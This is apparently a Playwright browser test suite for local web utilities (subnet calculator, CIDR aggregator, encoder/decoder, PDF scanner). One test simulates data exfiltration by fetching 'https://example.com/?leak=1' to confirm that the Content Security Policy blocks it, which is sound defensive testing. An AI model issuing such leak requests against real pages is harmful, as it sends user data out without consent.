# /// script
# requires-python = ">=3.10"
# dependencies = ["playwright>=1.48"]
# ///
"""Browser smoke and regression tests for the webutils.

Run with:  uv run tests/smoke_test.py
First time: uv run --with playwright playwright install chromium

Serves the repository root over HTTP on a random port and drives each tool
in headless Chromium. The tools load their libraries from public CDNs, so
the tests need network access.
"""

import functools
import http.server
import sys
import threading
import traceback
from pathlib import Path

from playwright.sync_api import Page, expect, sync_playwright

ROOT = Path(__file__).resolve().parent.parent
TESTS = []


def test(fn):
    TESTS.append(fn)
    return fn


def serve():
    class Quiet(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args):
            pass

    handler = functools.partial(Quiet, directory=str(ROOT))
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, f"http://127.0.0.1:{httpd.server_address[1]}"


class Ctx:
    def __init__(self, browser, base):
        self.browser = browser
        self.base = base

    def page(self, path, storage=None):
        """Open a fresh context; fail the test on any page error or console error."""
        context = self.browser.new_context(permissions=["clipboard-read", "clipboard-write"])
        if storage:
            script = "".join(f"localStorage.setItem({k!r}, {v!r});" for k, v in storage.items())
            context.add_init_script(f"if (!sessionStorage.getItem('__seeded')) {{ {script} sessionStorage.setItem('__seeded', '1'); }}")
        page = context.new_page()
        page.errors = []
        page.on("pageerror", lambda e: page.errors.append(f"pageerror: {e}"))
        page.on("console", lambda m: m.type == "error" and page.errors.append(f"console.error: {m.text}"))
        page.goto(path if "://" in path else self.base + path)
        return page


def no_errors(page: Page):
    assert not page.errors, "\n".join(page.errors)


# --- every tool loads cleanly -------------------------------------------------

@test
def all_pages_load(c: Ctx):
    for path, marker in [
        ("/index.html", "Subnet Calculator"),
        ("/webutils/subnet-calculator.html", "Subnet Address"),
        ("/webutils/cidr-aggregator.html", "Input CIDRs"),
        ("/webutils/encoder-decoder.html", "Format"),
        ("/webutils/pdf-scanner.html", "Upload PDF"),
    ]:
        page = c.page(path)
        expect(page.get_by_text(marker).first).to_be_visible(timeout=20000)
        no_errors(page)
        page.context.close()


@test
def pages_work_from_file_urls(c: Ctx):
    """README promise: double-click any .html file, no server needed."""
    for name, marker in [
        ("subnet-calculator.html", "Subnet Address"),
        ("cidr-aggregator.html", "Input CIDRs"),
        ("encoder-decoder.html", "Format"),
        ("pdf-scanner.html", "Upload PDF"),
    ]:
        page = c.page((ROOT / "webutils" / name).as_uri())
        expect(page.get_by_text(marker).first).to_be_visible(timeout=20000)
        no_errors(page)
        page.context.close()


@test
def csp_blocks_network(c: Ctx):
    """The CSP must stop a compromised dependency from sending data anywhere."""
    for name in ["subnet-calculator.html", "cidr-aggregator.html", "encoder-decoder.html", "pdf-scanner.html"]:
        page = c.page(f"/webutils/{name}")
        page.wait_for_load_state("networkidle")
        outcome = page.evaluate("""async () => {
            try { await fetch('https://example.com/?leak=1', {mode: 'no-cors'}); return 'sent'; }
            catch (e) { return 'blocked'; }
        }""")
        assert outcome == "blocked", f"{name}: fetch was not blocked"
        page.context.close()


# --- subnet calculator --------------------------------------------------------

@test
def subnet_divide_and_join(c: Ctx):
    page = c.page("/webutils/subnet-calculator.html")
    page.get_by_role("textbox").first.fill("192.168.0.0")
    page.locator("input[type=number]").first.fill("24")
    page.get_by_role("button", name="Update").click()
    expect(page.get_by_text("192.168.0.0", exact=True).first).to_be_visible()
    page.get_by_title("Split into two smaller subnets").first.click()
    expect(page.get_by_title("Split into two smaller subnets")).to_have_count(2)
    expect(page.get_by_text("192.168.0.128", exact=True)).to_be_visible()
    page.get_by_title("Join subnets back to /24").click()
    expect(page.get_by_title("Split into two smaller subnets")).to_have_count(1)
    no_errors(page)


def subnet_rows(page: Page):
    return page.get_by_title("Split into two smaller subnets")


@test
def subnet_ignores_garbage_saved_state(c: Ctx):
    page = c.page("/webutils/subnet-calculator.html",
                  storage={"subnet-calc-network": "abc", "subnet-calc-cidr": "33"})
    expect(page.get_by_text("10.128.160.0", exact=True).first).to_be_visible()
    expect(subnet_rows(page)).to_have_count(1)
    no_errors(page)


@test
def subnet_persists_only_committed_network(c: Ctx):
    page = c.page("/webutils/subnet-calculator.html")
    page.get_by_role("textbox").first.fill("172.16.5.9")
    page.locator("input[type=number]").first.fill("16")
    page.get_by_role("button", name="Update").click()
    expect(page.get_by_role("textbox").first).to_have_value("172.16.0.0")
    page.get_by_role("textbox").first.fill("10.0")  # half-typed draft
    page.goto(c.base + "/webutils/subnet-calculator.html")  # reopen without any link
    expect(page.get_by_role("textbox").first).to_have_value("172.16.0.0")
    expect(page.locator("input[type=number]").first).to_have_value("16")
    no_errors(page)


@test
def subnet_links_are_validated(c: Ctx):
    for link in ["#ip=192.168.1.77&cidr=24&split=192.168.1.0/24", "?ip=192.168.1.77&cidr=24&split=192.168.1.0/24"]:
        page = c.page("/webutils/subnet-calculator.html" + link)
        expect(page.get_by_role("textbox").first).to_have_value("192.168.1.0")
        expect(subnet_rows(page)).to_have_count(2)
        assert "?" not in page.url and "#ip=192.168.1.0&cidr=24" in page.url, page.url
        no_errors(page)
        page.context.close()
    # junk, misaligned and out-of-range split ids are dropped
    page = c.page("/webutils/subnet-calculator.html#ip=192.168.1.0&cidr=24"
                  "&split=192.168.1.0/24,10.0.0.0/8,192.168.1.5/30,abc,192.168.1.0/32")
    expect(subnet_rows(page)).to_have_count(2)
    no_errors(page)
    page.context.close()
    page = c.page("/webutils/subnet-calculator.html#ip=foo&cidr=99")
    expect(page.get_by_text("Ignored invalid link")).to_be_visible()
    expect(page.get_by_text("10.128.160.0", exact=True).first).to_be_visible()
    no_errors(page)


@test
def subnet_exports(c: Ctx):
    page = c.page("/webutils/subnet-calculator.html#ip=10.0.0.0&cidr=30&split=10.0.0.0/30")
    expect(subnet_rows(page)).to_have_count(2)  # two /31 leaves
    page.get_by_role("button", name="CSV").click()
    expect(page.get_by_text("Copied!")).to_be_visible()
    csv = page.evaluate("navigator.clipboard.readText()")
    assert csv.splitlines() == [
        '"Level 1","Level 2","Subnet","Netmask","Range","Useable IPs","Hosts"',
        '"10.0.0.0/30","10.0.0.0/31","10.0.0.0/31","255.255.255.254","10.0.0.0 - 10.0.0.1","10.0.0.0 - 10.0.0.1","2"',
        '"10.0.0.0/30","10.0.0.2/31","10.0.0.2/31","255.255.255.254","10.0.0.2 - 10.0.0.3","10.0.0.2 - 10.0.0.3","2"',
    ], repr(csv)
    page.get_by_role("button", name="Spreadsheet").click()
    expect(page.get_by_text("Copied!")).to_have_count(2)
    tsv = page.evaluate("navigator.clipboard.readText()")
    assert tsv.splitlines()[1].split("\t")[:2] == ["10.0.0.0/30", "10.0.0.0/31"], tsv
    no_errors(page)


# --- CIDR aggregator ----------------------------------------------------------

@test
def aggregator_merges(c: Ctx):
    page = c.page("/webutils/cidr-aggregator.html")
    page.locator("textarea").fill("192.168.0.0/24\n192.168.1.0/24\n10.0.0.5\n10.0.0.4")
    results = page.locator("a[title='Visualize in Subnet Calculator']")
    expect(results).to_have_text(["10.0.0.4/31", "192.168.0.0/23"])
    no_errors(page)


# --- encoder / decoder --------------------------------------------------------

def codec_output(page: Page):
    return page.get_by_test_id("output")


@test
def codec_base64_roundtrip(c: Ctx):
    page = c.page("/webutils/encoder-decoder.html")
    page.locator("textarea").first.fill("hello world")
    page.locator("select").select_option("Base64")
    expect(codec_output(page)).to_have_text("aGVsbG8gd29ybGQ=")
    no_errors(page)


def codec_set(page: Page, mode: str, algo: str, text: str):
    page.get_by_role("button", name=mode, exact=True).click()
    page.locator("select").select_option(algo)
    page.locator("textarea").first.fill(text)


@test
def codec_unicode_roundtrips(c: Ctx):
    """Byte codecs used to split non-ASCII text into UTF-16 code units."""
    text = "€ héllo 日本 🎉"
    expected = {
        "Hexadecimal": "e282ac2068c3a96c6c6f20e697a5e69cac20f09f8e89",
        "Base64": "4oKsIGjDqWxsbyDml6XmnKwg8J+OiQ==",
    }
    page = c.page("/webutils/encoder-decoder.html")
    for algo in ["Hexadecimal", "Base64", "Base32", "Base58", "Binary", "UUEncode"]:
        codec_set(page, "Encode", algo, text)
        if algo in expected:
            expect(codec_output(page)).to_have_text(expected[algo])
        else:
            expect(codec_output(page)).not_to_have_text("")
        page.get_by_role("button", name="Swap").click()
        expect(page.locator("select")).to_have_value(algo)
        expect(codec_output(page)).to_have_text(text)
    no_errors(page)


@test
def codec_auto_detect(c: Ctx):
    page = c.page("/webutils/encoder-decoder.html")
    cases = [
        ("aGVsbG8gd29ybGQ=", "Base64", "hello world"),
        ("68656c6c6f", "Hexadecimal", "hello"),
        ("NBSWY3DP", "Base32", "hello"),
        ("hello%20world", "URL Encoding", "hello world"),
        # plain words used to be "decoded" as Base32 garbage
        ("uryyb", "ROT13", "hello"),
        ("hello", "ROT13", "uryyb"),
    ]
    for encoded, fmt, decoded in cases:
        codec_set(page, "Decode", "Auto", encoded)
        expect(codec_output(page)).to_have_text(decoded)
        expect(page.get_by_text(f"Decoded Output ({fmt})")).to_be_visible()
    no_errors(page)


@test
def codec_hashes(c: Ctx):
    """CryptoJS was replaced by Web Crypto + inline MD5; also check file://."""
    vectors = {
        "MD5": "900150983cd24fb0d6963f7d28e17f72",
        "SHA-1": "a9993e364706816aba3e25717850c26c9cd0d89d",
        "SHA-256": "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
    }
    for url in ["/webutils/encoder-decoder.html", (ROOT / "webutils" / "encoder-decoder.html").as_uri()]:
        page = c.page(url)
        for algo, digest in vectors.items():
            codec_set(page, "Hash", algo, "abc")
            expect(codec_output(page)).to_have_text(digest)
        no_errors(page)
        page.context.close()


@test
def codec_share_link_wins_over_saved_state(c: Ctx):
    stale = {"stringcodec-input": "stale", "stringcodec-mode": "encode", "stringcodec-algo": "Hexadecimal"}
    for query in ["#mode=decode&algo=Base64&text=aGk%3D", "?mode=decode&algo=Base64&text=aGk%3D"]:
        page = c.page("/webutils/encoder-decoder.html" + query, storage=stale)
        expect(codec_output(page)).to_have_text("hi")
        no_errors(page)
        page.context.close()


@test
def codec_share_link_uses_fragment_and_input_is_session_only(c: Ctx):
    page = c.page("/webutils/encoder-decoder.html")
    codec_set(page, "Encode", "Base64", "secret")
    page.get_by_role("button", name="Share Link").click()
    link = page.evaluate("navigator.clipboard.readText()")
    assert "#mode=encode&algo=Base64&text=secret" in link and "?" not in link, link
    assert page.evaluate("localStorage.getItem('stringcodec-input')") is None
    assert page.evaluate("sessionStorage.getItem('stringcodec-input')") == "secret"
    page.reload()
    expect(codec_output(page)).to_have_text("c2VjcmV0")
    no_errors(page)


# --- PDF scanner -------------------------------------------------------------

def make_pdf(pages):
    """Minimal vector-only PDF; pages is a list of (width_pt, height_pt)."""
    objs = ["<< /Type /Catalog /Pages 2 0 R >>", None]
    kids = []
    for w, h in pages:
        content = f"0 0 0 rg 36 36 {w - 72} 20 re f 0.5 g 36 {h - 120} {w / 2} 60 re f".encode()
        objs.append(f"<< /Length {len(content)} >>\nstream\n{content.decode()}\nendstream")
        objs.append(f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 {w} {h}] /Contents {len(objs)} 0 R /Resources << >> >>")
        kids.append(f"{len(objs)} 0 R")
    objs[1] = f"<< /Type /Pages /Kids [{' '.join(kids)}] /Count {len(pages)} >>"
    out, offsets = b"%PDF-1.4\n", []
    for i, body in enumerate(objs, 1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n{body}\nendobj\n".encode()
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    out += "".join(f"{o:010d} 00000 n \n" for o in offsets).encode()
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def load_pdf(page: Page, pages):
    page.locator("#fileInput").set_input_files(
        files=[{"name": "t.pdf", "mimeType": "application/pdf", "buffer": make_pdf(pages)}])
    expect(page.locator("#pageCountBadge")).to_have_text(f"{len(pages)} Pages", timeout=20000)


def export_pdf(page: Page) -> bytes:
    with page.expect_download(timeout=60000) as dl:
        page.locator("#downloadBtn").click()
    return Path(dl.value.path()).read_bytes()


@test
def scanner_loads_and_exports(c: Ctx):
    page = c.page("/webutils/pdf-scanner.html")
    load_pdf(page, [(595, 842), (842, 595)])
    expect(page.locator("#previewWrapper canvas")).to_have_count(1)
    data = export_pdf(page)
    assert data.startswith(b"%PDF"), data[:20]
    no_errors(page)


# --- runner -------------------------------------------------------------------

def main(selected):
    httpd, base = serve()
    failed = 0
    with sync_playwright() as p:
        browser = p.chromium.launch()
        c = Ctx(browser, base)
        for fn in TESTS:
            if selected and fn.__name__ not in selected:
                continue
            try:
                fn(c)
                print(f"ok   {fn.__name__}")
            except Exception:
                failed += 1
                print(f"FAIL {fn.__name__}")
                traceback.print_exc()
        browser.close()
    httpd.shutdown()
    print(f"\n{len(TESTS) - failed if not selected else '-'} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
